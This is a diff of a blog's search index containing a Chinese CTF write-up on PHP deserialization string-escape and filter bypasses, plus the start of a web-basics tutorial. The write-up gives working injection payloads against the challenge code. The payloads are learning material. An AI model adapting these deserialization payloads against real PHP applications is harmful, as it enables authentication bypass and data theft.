@@ -513,61 +513,6 @@
       </tags>
   </entry>
   <entry>
-    <title>NUCTF</title>
-    <url>/2021/06/24/NUCTF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
-<span id="more"></span>
-
-<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>分析：</strong></p>
-<blockquote>
-<ol>
-<li>POST 传入参数 username 和 password</li>
-<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
-<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li>
-</ol>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<ol start="4">
-<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
-<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
-</ol>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>payload：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>分析：</strong></p>
-<blockquote>
-<ol>
-<li>GET 传参 obj；</li>
-<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
-<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
-<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
-</ol>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>payload：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTF-Show-爆破</title>
     <url>/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF show 爆破篇。</p>
@@ -670,6 +615,293 @@
       <tags>
         <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>NUCTF</title>
+    <url>/2021/06/24/NUCTF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
+<span id="more"></span>
+
+<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<blockquote>
+<ol>
+<li>POST 传入参数 username 和 password</li>
+<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
+<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol start="4">
+<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
+<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<blockquote>
+<ol>
+<li>GET 传参 obj；</li>
+<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
+<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
+<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
+</ol>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web基础</title>
+    <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
+<span id="more"></span>
+
+<h2 id="一、访问网页流程"><a href="#一、访问网页流程" class="headerlink" title="一、访问网页流程"></a>一、访问网页流程</h2><h3 id="1-1-访问静态网页流程"><a href="#1-1-访问静态网页流程" class="headerlink" title="1.1 访问静态网页流程"></a>1.1 访问静态网页流程</h3><ul>
+<li><p><strong>编写</strong>：HTML , CSS , JavaScript</p>
+</li>
+<li><p><strong>流程</strong>：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。</p>
+</li>
+</ul>
+<h3 id="1-2-访问动态网页流程"><a href="#1-2-访问动态网页流程" class="headerlink" title="1.2 访问动态网页流程"></a>1.2 访问动态网页流程</h3><ul>
+<li><p><strong>编写</strong>：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。</p>
+</li>
+<li><p><strong>流程</strong>：判断请求文件扩展名之后，将会将对应的文件交给 <code>PHP脚本引擎</code> 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。</p>
+</li>
+<li><p><strong>数据库</strong>：SQL Server , MySQL , Oracle</p>
+</li>
+</ul>
+<h2 id="二、Web应用基本架构"><a href="#二、Web应用基本架构" class="headerlink" title="二、Web应用基本架构"></a>二、Web应用基本架构</h2><p>Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库</p>
+<p>常见Web服务端架构：</p>
+<p><img src="https://i.loli.net/2021/05/25/rDAOBg9jn8bZ7R4.png" alt="image-20210404084121968"></p>
+<p>LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL</p>
+<h2 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h2><p>URL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等）</p>
+<ul>
+<li><p><strong>标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment  真正访问的是@之后的地址</strong></p>
+<ul>
+<li><p>userInfo：user:password  不推荐</p>
+</li>
+<li><p><strong>井号</strong>：在URL中指定的是页面中的一个位置</p>
+<p>井号作为 页面定位符 出现在URL中，比如：<em><a href="http://www.httpwatch.com/features.htm#print">http://www.httpwatch.com/features.htm#print</a></em> ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>URL编码：</strong></p>
+<ul>
+<li><p>产生原因：一些特殊字符会含有不同而含义：<code>?username=1&amp;passwd=2%263</code> ，为了区分。RFC标准提出 <code>URL编码方案</code></p>
+</li>
+<li><p>常见：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=  	%3d</span><br><span class="line">#	%23</span><br><span class="line">%	%25</span><br><span class="line">&amp;	%26</span><br><span class="line">/	%2f</span><br><span class="line">空格	%20</span><br><span class="line">换行	%0a</span><br><span class="line">空字节	%00</span><br><span class="line">加号 	+ 代表URL编码当中的 空格</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="四、HTTP"><a href="#四、HTTP" class="headerlink" title="四、HTTP"></a>四、HTTP</h2><p>HTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。<strong>无状态的协议</strong></p>
